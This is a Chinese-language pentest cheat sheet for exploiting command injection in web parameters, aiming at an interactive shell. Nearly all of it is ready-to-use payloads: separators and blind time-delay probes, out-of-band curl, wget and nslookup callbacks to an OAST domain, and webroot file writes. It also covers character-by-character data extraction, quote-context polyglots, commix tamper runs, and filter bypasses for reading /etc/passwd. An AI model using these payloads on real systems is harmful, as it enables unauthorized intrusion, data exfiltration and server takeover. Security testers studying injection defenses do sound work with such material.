# 命令注入

> **TECH：** HTTP 参数进入 shell/argv
> **成功：** 稳定 OS 命令执行，并推进到 interactive shell
> 不算：commix 报 injection、一次 timeout

## 命令注入

### 连接符

```
;    执行完前面再执行后面         %3B
&    同时执行                    %26
&&   前执行成功→后执行           %26%26
|    前结果给后执行(管道)        %7C
||   前失败→后执行               %7C%7C
$(cmd)  命令替换                 %24%28cmd%29
`cmd`   反引号命令替换
```

### 判断cmd还是PowerShell

```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

URL编码后发送。

### 常见注入点

```
# POST请求
curl -X POST --data 'param=value;id' http://TARGET/endpoint

# URL编码
curl -X POST --data 'param=value%3Bid' http://TARGET/endpoint
```

### 盲注入确认

没有命令输出时不要直接放弃。按 **时间 → OOB → 文件型 → 条件抽取** 逐级确认。

#### 1. 时间型 Blind CMDi

先测 3 次正常请求得到基线，再测试延时；不要只看一次慢响应。

Linux：

```text
; sleep 5
&& sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
```

Windows：

```text
& ping -n 6 127.0.0.1 >NUL
& timeout /t 5 /nobreak >NUL
```

判断：

```text
正常请求先实测基线（连续3次）
注入请求相对基线稳定增加约 5s
重复 2-3 次仍成立
→ 强 CMDi 信号
```

如果接口本身是异步任务/消息队列，HTTP 响应时间可能不受命令影响，转 OOB。

#### 2. OOB DNS / HTTP

攻击机：

```bash
interactsh-client
```

把生成域名记为 `UNIQUE.oast.site`。

Linux：

```text
; nslookup UNIQUE.oast.site
; curl http://UNIQUE.oast.site/cmdi
; wget -qO- http://UNIQUE.oast.site/cmdi
```

Windows：

```text
& nslookup UNIQUE.oast.site
& powershell -c "iwr http://UNIQUE.oast.site/cmdi -UseBasicParsing"
```

收到来自目标网络的 DNS/HTTP 回连：

```text
→ 证明服务端执行
→ 再判断实际 shell / OS / 可用命令
```

若只允许 DNS，可在 CTF/靶场用短值验证命令输出，例如 hostname/用户名的短片段；真实环境先按授权边界控制数据量。

#### 3. File-based / Semi-blind

已知可写且 Web 可访问目录时：

```text
; whoami > /var/www/html/cmdi.txt
```

然后：

```bash
curl http://TARGET/cmdi.txt
```

如果 WebRoot 不可写但 `/tmp` 可写：

```text
; whoami > /tmp/cmdi.txt
```

再通过 LFI、下载功能或时间条件读取。不要盲猜 WebRoot 后直接判失败。

#### 4. Boolean / Time-based 数据判断

Blind CMDi 已确认但没有任何回显/OOB时，可把命令结果转换成条件延迟。示例：

```text
; [ "$(whoami | cut -c 1)" = "w" ] && sleep 5
```

用途：

```text
确认用户名/hostname特征
确认文件是否存在
确认命令是否可用
```

完整逐字符抽取很慢，只在 CTF/确实没有其他回显通道时使用。

### 上下文不明时的 Polyglot / Context Probes

不要把一个“大而全 polyglot”当成最终 exploit。它的作用是**不知道输入位于未引用、单引号还是双引号 shell context 时，快速找出哪一类语法能改变执行流**。

先分组测试：

```text
# unquoted
;sleep${IFS}5;#

# command substitution
$(sleep${IFS}5)
`sleep${IFS}5`

# close single quote candidate
';sleep${IFS}5;#

# close double quote candidate
";sleep${IFS}5;#
```

需要单请求覆盖多个常见 Unix shell context 时，可用时间型 polyglot 探针：

```text
x;sleep${IFS}5;#';sleep${IFS}5;#";sleep${IFS}5;#
```

判断：

```text
polyglot产生稳定延时
  ↓
不要直接拿它反弹shell
  ↓
拆成最小payload，定位实际 quote/delimiter context
  ↓
选择最短可靠payload
```

如果输入不是经过 shell，而只是作为某个程序的 argv，shell metacharacter/polyglot 可能完全无效，此时考虑 **argument injection**，不要误判为“已过滤 CMDi”。

### Commix 自动验证

复杂请求优先保存 Burp raw request：

```bash
python3 commix.py -r request.txt
```

GET 示例：

```bash
python3 commix.py -u 'http://TARGET/ping?host=127.0.0.1' -p host
```

只测结果型 + 时间型 + 文件型：

```bash
python3 commix.py \
  -u 'http://TARGET/ping?host=127.0.0.1' \
  -p host \
  --technique='ctf' \
  --time-sec=5
```

已知 context 需要前后缀时：

```bash
python3 commix.py -r request.txt -p host --prefix="'" --suffix="#"
```

有过滤器时查看/选择 tamper：

```bash
python3 commix.py --list-tampers
python3 commix.py -r request.txt -p host --tamper='space2ifs'
```

确认注入后只执行最小命令验证：

```bash
python3 commix.py -r request.txt -p host --os-cmd='whoami'
```

Commix 是验证/辅助，不替代手工判断。若工具失败但时间/OOB evidence 稳定，继续手工分析输入上下文和 parser chain。

### 绕过过滤

```
# 空格被过滤
${IFS}           # Linux内部字段分隔符
%09              # Tab
{cat,/etc/passwd}  # Brace expansion

# 关键字被过滤
c'a't /etc/passwd    # 引号拆分
c""at /etc/passwd
cat /etc/pas${x}swd  # 变量插入

# 反斜杠
c\at /etc/passwd
```
